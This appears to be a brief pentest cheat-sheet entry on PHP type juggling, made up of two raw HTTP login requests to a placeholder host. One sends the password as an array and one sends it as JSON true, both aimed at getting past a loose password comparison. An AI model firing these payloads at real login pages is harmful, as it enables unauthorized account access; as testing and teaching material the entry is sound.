# Type Juggling
```http
POST https://example.com/login.php HTTP/1.1
Accept: */*
Content-Type: application/json

usuario=admin&password[]=anything

POST https://example.com/login.php HTTP/1.1
Accept: */*
Content-Type: application/json

{
"password": true
}
```
